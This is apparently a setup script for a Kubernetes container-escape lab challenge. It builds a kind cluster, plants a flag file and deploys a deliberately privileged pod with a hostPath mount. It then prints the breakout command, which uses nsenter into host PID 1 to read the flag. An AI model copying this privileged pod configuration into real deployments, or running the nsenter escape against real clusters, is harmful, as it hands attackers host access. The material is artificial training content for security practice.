#!/bin/bash
set -euo pipefail
CLUSTER_NAME="cve-k8s-11-privileged"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

FLAG="${CVE_FLAG:-flag{k8s-11-default}}"
mkdir -p /home/kianabin/cve-flags/k8s-11
echo "$FLAG" > /home/kianabin/cve-flags/k8s-11/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"
docker pull alpine:latest 2>/dev/null
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
    - name: breakout
      image: alpine:latest
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

echo "[+] K8S-11 ready"
echo "[+] Attack: kubectl exec privileged-pod -- nsenter --mount --uts --ipc --net --pid --target 1 cat /host-flag/flag.txt"
echo "[+] Flag: $FLAG"
